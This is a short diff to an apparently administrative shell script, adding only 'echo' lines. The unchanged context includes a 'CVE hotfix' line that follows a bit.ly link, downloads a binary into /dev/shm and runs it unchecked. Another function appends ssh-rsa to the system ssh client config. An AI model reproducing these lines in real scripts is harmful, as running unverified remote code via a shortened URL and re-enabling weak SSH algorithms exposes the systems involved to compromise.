@@ -625,6 +625,7 @@ fi
 tweak_cve_func() {
 
 	# CVE-2026-31431 hotfix (Copy Fail LPE)
+	echo
 	b="/dev/shm/cve_2026_31431_hotfix"; wget -qO $b $(wget -qO- https://bit.ly/4elJXcG | grep browser_download_url | grep -v .exe | cut -d '"' -f 4) && chmod +x $b && $b
 
 }
@@ -632,6 +633,7 @@ tweak_cve_func() {
 # Ubuntu 2x add ssh-rsa for ssh client
 tweak_ssh_client_func() {
 
+	echo
 	printf "Adding ssh-rsa algorithm to ssh client\n"
 
 	. /etc/os-release && [[ $NAME == Ubuntu ]] && [[ $VERSION_ID =~ ^2[4-9]\. ]] && { grep -RiIqE 'HostKeyAlgorithms|PubkeyAcceptedKeyTypes' /etc/ssh/ssh_config* || { echo 'HostKeyAlgorithms +ssh-rsa' >> /etc/ssh/ssh_config && echo 'PubkeyAcceptedKeyTypes +ssh-rsa' >> /etc/ssh/ssh_config;} }
